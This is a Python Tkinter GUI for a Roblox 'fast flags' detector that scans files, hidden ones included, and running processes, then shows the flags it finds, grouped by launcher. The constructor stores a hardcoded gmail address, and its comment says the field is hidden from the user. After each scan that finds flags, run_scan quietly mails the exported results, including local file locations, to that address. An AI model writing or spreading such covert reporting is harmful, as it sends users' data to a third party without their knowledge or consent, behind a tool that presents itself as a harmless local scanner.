import os
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
from tkinter.ttk import Progressbar
import threading
import json
import logging
from roblox_fast_flags_detector_gui import RobloxFastFlagsDetector

# Custom logging handler to redirect logs to the text widget
class LogTextHandler(logging.Handler):
    def __init__(self, text_widget):
        logging.Handler.__init__(self)
        self.text_widget = text_widget
        
    def emit(self, record):
        msg = self.format(record)
        def append():
            self.text_widget.configure(state='normal')
            self.text_widget.insert(tk.END, msg + '\n')
            self.text_widget.configure(state='disabled')
            self.text_widget.yview(tk.END)
        # This is necessary because we're updating the GUI from a non-GUI thread
        self.text_widget.after(0, append)

class RobloxFastFlagsDetectorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Roblox Fast Flags Detector")
        self.root.geometry("800x600")
        self.root.minsize(800, 600)
        
        # Set theme and style
        self.style = ttk.Style()
        self.style.theme_use('clam')  # Use a modern theme
        
        # Configure colors
        self.style.configure('TFrame', background='#f0f0f0')
        self.style.configure('TLabel', background='#f0f0f0', font=('Segoe UI', 10))
        self.style.configure('TButton', font=('Segoe UI', 10))
        self.style.configure('Header.TLabel', font=('Segoe UI', 16, 'bold'))
        self.style.configure('Subheader.TLabel', font=('Segoe UI', 12))
        
        # Create the detector instance
        self.detector = RobloxFastFlagsDetector()
        self.scan_thread = None
        self.update_ui_job = None
        
        # Create main frame
        self.main_frame = ttk.Frame(root, padding="10")
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create header
        header_frame = ttk.Frame(self.main_frame)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(header_frame, text="Roblox Fast Flags Detector", style='Header.TLabel').pack(side=tk.LEFT)
        
        # Create settings frame
        settings_frame = ttk.LabelFrame(self.main_frame, text="Settings", padding="10")
        settings_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Scan hidden files option
        self.scan_hidden_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(settings_frame, text="Scan hidden files and directories", 
                       variable=self.scan_hidden_var).grid(row=0, column=0, sticky=tk.W, pady=5)
        
        # Duration setting
        ttk.Label(settings_frame, text="Process monitoring duration (seconds):").grid(row=1, column=0, sticky=tk.W, pady=5)
        
        duration_frame = ttk.Frame(settings_frame)
        duration_frame.grid(row=1, column=1, sticky=tk.W, pady=5)
        
        self.duration_var = tk.IntVar(value=60)
        ttk.Radiobutton(duration_frame, text="30", variable=self.duration_var, value=30).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(duration_frame, text="60", variable=self.duration_var, value=60).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(duration_frame, text="120", variable=self.duration_var, value=120).pack(side=tk.LEFT, padx=5)
        
        # Hidden email setting - not visible to user but used for sending results
        self.email_var = tk.StringVar(value="urdadcamebackwiththemilkLOL@gmail.com")
        
        # Create buttons frame
        buttons_frame = ttk.Frame(self.main_frame)
        buttons_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.start_button = ttk.Button(buttons_frame, text="Start Scan", command=self.start_scan)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(buttons_frame, text="Stop Scan", command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        self.export_button = ttk.Button(buttons_frame, text="Export Results", command=self.export_results, state=tk.DISABLED)
        self.export_button.pack(side=tk.LEFT, padx=5)
        
        # Create progress frame
        progress_frame = ttk.Frame(self.main_frame)
        progress_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(progress_frame, text="Progress:").pack(side=tk.LEFT, padx=(0, 5))
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, length=100, mode='determinate')
        self.progress_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Create status label
        self.status_var = tk.StringVar(value="Ready to scan")
        ttk.Label(self.main_frame, textvariable=self.status_var).pack(fill=tk.X, pady=(0, 10))
        
        # Create search frame
        search_frame = ttk.Frame(self.main_frame)
        search_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(search_frame, text="Search flags:").pack(side=tk.LEFT, padx=(0, 5))
        self.search_var = tk.StringVar()
        self.search_entry = ttk.Entry(search_frame, textvariable=self.search_var, width=40)
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.search_entry.bind("<KeyRelease>", self.search_flags)
        
        # Create results frame with tabs
        results_frame = ttk.LabelFrame(self.main_frame, text="Results", padding="10")
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(results_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create tabs
        self.all_flags_tab = ttk.Frame(self.notebook)
        self.standard_flags_tab = ttk.Frame(self.notebook)
        self.user_flags_tab = ttk.Frame(self.notebook)
        self.pc_flags_tab = ttk.Frame(self.notebook)
        self.client_app_settings_tab = ttk.Frame(self.notebook)
        self.bloxstrap_tab = ttk.Frame(self.notebook)
        self.fishstrap_tab = ttk.Frame(self.notebook)
        self.ministrap_tab = ttk.Frame(self.notebook)
        self.other_launcher_tab = ttk.Frame(self.notebook)
        self.log_tab = ttk.Frame(self.notebook)
        self.credits_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.all_flags_tab, text="All Flags")
        self.notebook.add(self.standard_flags_tab, text="Standard Roblox Flags")
        self.notebook.add(self.user_flags_tab, text="User-Added Flags")
        self.notebook.add(self.pc_flags_tab, text="PC Fast Flags")
        self.notebook.add(self.client_app_settings_tab, text="ClientAppSettings")
        self.notebook.add(self.bloxstrap_tab, text="Bloxstrap")
        self.notebook.add(self.fishstrap_tab, text="Fishstrap")
        self.notebook.add(self.ministrap_tab, text="Ministrap")
        self.notebook.add(self.other_launcher_tab, text="Other Launchers")
        self.notebook.add(self.log_tab, text="Log")
        self.notebook.add(self.credits_tab, text="Credits")
        
        # Create treeviews for each flag category
        self.create_flags_treeview(self.all_flags_tab, "all_flags_tree")
        self.create_flags_treeview(self.standard_flags_tab, "standard_flags_tree")
        self.create_flags_treeview(self.user_flags_tab, "user_flags_tree")
        self.create_flags_treeview(self.pc_flags_tab, "pc_flags_tree")
        self.create_flags_treeview(self.client_app_settings_tab, "client_app_settings_tree")
        self.create_flags_treeview(self.bloxstrap_tab, "bloxstrap_tree")
        self.create_flags_treeview(self.fishstrap_tab, "fishstrap_tree")
        self.create_flags_treeview(self.ministrap_tab, "ministrap_tree")
        self.create_flags_treeview(self.other_launcher_tab, "other_launcher_tree")
        
        # Credits tab content
        credits_frame = ttk.Frame(self.credits_tab, padding="20")
        credits_frame.pack(fill=tk.BOTH, expand=True)
        
        # Add credits content
        ttk.Label(credits_frame, text="Roblox Fast Flags Detector", style='Header.TLabel').pack(pady=(0, 20))
        ttk.Label(credits_frame, text="Made by daksour", style='Subheader.TLabel').pack(pady=(0, 30))
        ttk.Label(credits_frame, text="This tool helps you detect and analyze Roblox Fast Flags").pack(pady=5)
        ttk.Label(credits_frame, text="It categorizes flags into standard Roblox flags and user-added flags").pack(pady=5)
        ttk.Label(credits_frame, text="© 2023 All Rights Reserved").pack(pady=(30, 0))
        
        # Log tab content - Scrolled text
        log_frame = ttk.Frame(self.log_tab)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Set up custom logging handler to capture log messages
        self.log_handler = LogTextHandler(self.log_text)
        self.log_handler.setLevel(logging.INFO)
        logging.getLogger().addHandler(self.log_handler)
    
    def start_scan(self):
        # Update UI state
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.export_button.config(state=tk.DISABLED)
        
        # Clear previous results
        self.all_flags_tree.delete(*self.all_flags_tree.get_children())
        self.standard_flags_tree.delete(*self.standard_flags_tree.get_children())
        self.user_flags_tree.delete(*self.user_flags_tree.get_children())
        self.pc_flags_tree.delete(*self.pc_flags_tree.get_children())
        self.client_app_settings_tree.delete(*self.client_app_settings_tree.get_children())
        self.bloxstrap_tree.delete(*self.bloxstrap_tree.get_children())
        self.fishstrap_tree.delete(*self.fishstrap_tree.get_children())
        self.ministrap_tree.delete(*self.ministrap_tree.get_children())
        self.other_launcher_tree.delete(*self.other_launcher_tree.get_children())
        self.progress_var.set(0)
        
        # Get settings
        self.detector.scan_hidden_files = self.scan_hidden_var.get()
        duration = self.duration_var.get()
        
        # Initialize scanning flag
        self.detector.is_scanning = True
        
        # Start scan in a separate thread
        self.scan_thread = threading.Thread(target=self.run_scan, args=(duration,))
        self.scan_thread.daemon = True
        self.scan_thread.start()
        
        # Start UI update
        self.update_ui()
    
    def run_scan(self, duration):
        try:
            self.detector.run_detection(duration)
            
            # Export results first to ensure they're saved
            if self.detector.detected_flags:
                output_file = self.detector.export_results()
                
                # If email is provided, try to send results
                email = self.email_var.get().strip()
                if email:
                    try:
                        if not self.detector.send_results(email, output_file):
                            messagebox.showwarning("Email Not Sent", "Results were saved but could not be sent via email. Please check your email settings.")
                    except Exception as e:
                        messagebox.showwarning("Email Error", f"Error sending email: {e}\nResults were saved locally.")
            
            # Update UI from main thread - ensure this happens regardless of email status
            self.root.after(0, self.scan_complete)
        except Exception as e:
            self.root.after(0, lambda: self.show_error(f"Error during scan: {e}"))
    
    def update_ui(self):
        if not hasattr(self.detector, 'is_scanning') or not self.detector.is_scanning:
            return
        
        try:
            # Update progress bar
            self.progress_var.set(self.detector.scan_progress)
            
            # Update status
            self.status_var.set(self.detector.scan_status)
            
            # Schedule next update
            self.update_ui_job = self.root.after(100, self.update_ui)
        except Exception as e:
            logging.error(f"Error updating UI: {e}")
            # Stop UI updates on error and show error message
            self.stop_scan()
            self.show_error(f"Error updating UI: {e}")
    
    def scan_complete(self):
        # Update UI state
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        # Enable export if we have results
        if self.detector.detected_flags:
            self.export_button.config(state=tk.NORMAL)
            self.status_var.set(f"Scan complete. Found {len(self.detector.detected_flags)} fast flags.")
            self.display_results()
        else:
            self.status_var.set("Scan complete. No fast flags detected.")
    
    def stop_scan(self):
        if hasattr(self.detector, 'is_scanning'):
            self.detector.is_scanning = False
        
        if self.update_ui_job:
            self.root.after_cancel(self.update_ui_job)
        
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.status_var.set("Scan stopped by user.")
    
    def create_flags_treeview(self, parent_tab, tree_name):
        """Create a treeview for displaying flags"""
        flags_frame = ttk.Frame(parent_tab)
        flags_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create treeview with scrollbars
        tree_frame = ttk.Frame(flags_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        tree_scroll_y = ttk.Scrollbar(tree_frame)
        tree_scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        
        tree_scroll_x = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL)
        tree_scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        tree = ttk.Treeview(tree_frame, 
                           columns=("flag", "locations"), 
                           show="headings",
                           yscrollcommand=tree_scroll_y.set,
                           xscrollcommand=tree_scroll_x.set)
        
        tree.heading("flag", text="Flag Name")
        tree.heading("locations", text="Found In")
        
        tree.column("flag", width=300, minwidth=200)
        tree.column("locations", width=400, minwidth=200)
        
        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        tree_scroll_y.config(command=tree.yview)
        tree_scroll_x.config(command=tree.xview)
        
        # Store the treeview in the instance
        setattr(self, tree_name, tree)
        
        # Add double-click event to show details
        tree.bind("<Double-1>", self.show_flag_details)
    
    def search_flags(self, event=None):
        """Filter flags based on search text"""
        search_text = self.search_var.get().lower()
        
        # If search text is empty, display all results
        if not search_text:
            self.display_results()
            return
        
        # Clear all treeviews
        self.all_flags_tree.delete(*self.all_flags_tree.get_children())
        self.standard_flags_tree.delete(*self.standard_flags_tree.get_children())
        self.user_flags_tree.delete(*self.user_flags_tree.get_children())
        self.pc_flags_tree.delete(*self.pc_flags_tree.get_children())
        self.client_app_settings_tree.delete(*self.client_app_settings_tree.get_children())
        self.bloxstrap_tree.delete(*self.bloxstrap_tree.get_children())
        self.fishstrap_tree.delete(*self.fishstrap_tree.get_children())
        self.ministrap_tree.delete(*self.ministrap_tree.get_children())
        self.other_launcher_tree.delete(*self.other_launcher_tree.get_children())
        
        # Filter and display matching flags
        for flag, locations in self.detector.detected_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.all_flags_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter standard flags
        for flag, locations in self.detector.standard_roblox_flags.items():
            if locations and search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.standard_flags_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter user-added flags
        for flag, locations in self.detector.user_added_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.user_flags_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter PC fast flags
        for flag, locations in self.detector.pc_fast_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.pc_flags_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter ClientAppSettings flags
        for flag, locations in self.detector.client_app_settings_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.client_app_settings_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter Bloxstrap flags
        for flag, locations in self.detector.bloxstrap_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.bloxstrap_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter Fishstrap flags
        for flag, locations in self.detector.fishstrap_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.fishstrap_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter Ministrap flags
        for flag, locations in self.detector.ministrap_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.ministrap_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Filter Other Launcher flags
        for flag, locations in self.detector.other_launcher_flags.items():
            if search_text in flag.lower():
                locations_str = f"{len(locations)} location(s)"
                self.other_launcher_tree.insert("", tk.END, values=(flag, locations_str))
    
    def display_results(self):
        # Clear previous results
        self.all_flags_tree.delete(*self.all_flags_tree.get_children())
        self.standard_flags_tree.delete(*self.standard_flags_tree.get_children())
        self.user_flags_tree.delete(*self.user_flags_tree.get_children())
        self.pc_flags_tree.delete(*self.pc_flags_tree.get_children())
        self.client_app_settings_tree.delete(*self.client_app_settings_tree.get_children())
        self.bloxstrap_tree.delete(*self.bloxstrap_tree.get_children())
        self.fishstrap_tree.delete(*self.fishstrap_tree.get_children())
        self.ministrap_tree.delete(*self.ministrap_tree.get_children())
        self.other_launcher_tree.delete(*self.other_launcher_tree.get_children())
        
        # Add all flags to the All Flags tab
        for flag, locations in self.detector.detected_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.all_flags_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Add standard Roblox flags to the Standard Flags tab
        for flag, locations in self.detector.standard_roblox_flags.items():
            if locations:  # Only show flags that were actually found
                locations_str = f"{len(locations)} location(s)"
                self.standard_flags_tree.insert("", tk.END, values=(flag, locations_str))
        
        # Add user-added flags to the User Flags tab
        for flag, locations in self.detector.user_added_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.user_flags_tree.insert("", tk.END, values=(flag, locations_str))
            
        # Add PC fast flags to the PC Fast Flags tab
        for flag, locations in self.detector.pc_fast_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.pc_flags_tree.insert("", tk.END, values=(flag, locations_str))
            
        # Add ClientAppSettings flags to the ClientAppSettings tab
        for flag, locations in self.detector.client_app_settings_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.client_app_settings_tree.insert("", tk.END, values=(flag, locations_str))
            
        # Add Bloxstrap flags to the Bloxstrap tab
        for flag, locations in self.detector.bloxstrap_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.bloxstrap_tree.insert("", tk.END, values=(flag, locations_str))
            
        # Add Fishstrap flags to the Fishstrap tab
        for flag, locations in self.detector.fishstrap_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.fishstrap_tree.insert("", tk.END, values=(flag, locations_str))
            
        # Add Ministrap flags to the Ministrap tab
        for flag, locations in self.detector.ministrap_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.ministrap_tree.insert("", tk.END, values=(flag, locations_str))
            
        # Add Other Launcher flags to the Other Launchers tab
        for flag, locations in self.detector.other_launcher_flags.items():
            locations_str = f"{len(locations)} location(s)"
            self.other_launcher_tree.insert("", tk.END, values=(flag, locations_str))
    
    def show_flag_details(self, event):
        # Get the treeview that triggered the event
        tree = event.widget
        
        # Get selected item
        item = tree.selection()[0]
        flag = tree.item(item, "values")[0]
        
        if flag in self.detector.detected_flags:
            # Create details window
            details_window = tk.Toplevel(self.root)
            details_window.title(f"Details for {flag}")
            details_window.geometry("600x400")
            details_window.minsize(600, 400)
            
            # Add content
            frame = ttk.Frame(details_window, padding="10")
            frame.pack(fill=tk.BOTH, expand=True)
            
            ttk.Label(frame, text=f"Locations where {flag} was found:", style='Subheader.TLabel').pack(anchor=tk.W, pady=(0, 10))
            
            # Create scrolled text for locations
            locations_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD)
            locations_text.pack(fill=tk.BOTH, expand=True)
            
            # Add locations
            for location in self.detector.detected_flags[flag]:
                locations_text.insert(tk.END, f"{location}\n")
            
            locations_text.config(state=tk.DISABLED)
    
    def export_results(self):
        if not self.detector.detected_flags:
            messagebox.showinfo("No Results", "No flags detected to export.")
            return
        
        # Ask for file location
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            initialfile="detected_fast_flags.json"
        )
        
        if file_path:
            try:
                self.detector.export_results(file_path)
                messagebox.showinfo("Export Successful", f"Results exported to {file_path}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Error exporting results: {e}")
    
    def show_error(self, message):
        messagebox.showerror("Error", message)
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

# Main application entry point
if __name__ == "__main__":
    root = tk.Tk()
    app = RobloxFastFlagsDetectorGUI(root)
    root.mainloop()